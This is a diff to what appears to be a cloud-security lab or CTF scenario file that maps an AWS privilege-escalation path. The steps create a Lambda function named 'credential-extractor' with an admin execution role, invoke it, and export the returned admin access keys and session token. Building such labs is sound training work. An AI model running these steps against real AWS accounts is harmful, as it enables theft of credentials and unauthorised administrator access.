@@ -85,7 +85,7 @@ attackMap:
             EOF
             cd /tmp && zip -q lambda_function.zip lambda_function.py
         - description: "Create the Lambda function with the admin execution role"
-          command: "aws lambda create-function --function-name pl-lambda-001-credential-extractor --runtime python3.11 --role arn:aws:iam::{account_id}:role/pl-prod-lambda-001-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30"
+          command: "ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text) && aws lambda create-function --function-name pl-lambda-001-credential-extractor --runtime python3.11 --role arn:aws:iam::${ACCOUNT_ID}:role/pl-prod-lambda-001-to-admin-target-role --handler lambda_function.lambda_handler --zip-file fileb:///tmp/lambda_function.zip --timeout 30"
 
     - from: lambda-function
       to: target-role
@@ -100,8 +100,8 @@ attackMap:
           command: "aws lambda invoke --function-name pl-lambda-001-credential-extractor --payload '{}' /tmp/response.json && cat /tmp/response.json | jq '.'"
         - description: "Parse and export the extracted admin credentials"
           command: "BODY=$(cat /tmp/response.json | jq -r '.body') && export AWS_ACCESS_KEY_ID=$(echo \"$BODY\" | jq -r '.AWS_ACCESS_KEY_ID') && export AWS_SECRET_ACCESS_KEY=$(echo \"$BODY\" | jq -r '.AWS_SECRET_ACCESS_KEY') && export AWS_SESSION_TOKEN=$(echo \"$BODY\" | jq -r '.AWS_SESSION_TOKEN')"
-        - description: "Verify administrator access"
-          command: "aws sts get-caller-identity && aws iam list-users --max-items 3 --output table"
+        - description: "Confirm the session is the assumed admin role (the assumed-role ARN is the escalation; an iam list-users attempt denies by boundary containment)"
+          command: "aws sts get-caller-identity --query 'Arn' --output text"
 
     - from: target-role
       to: ctf-flag
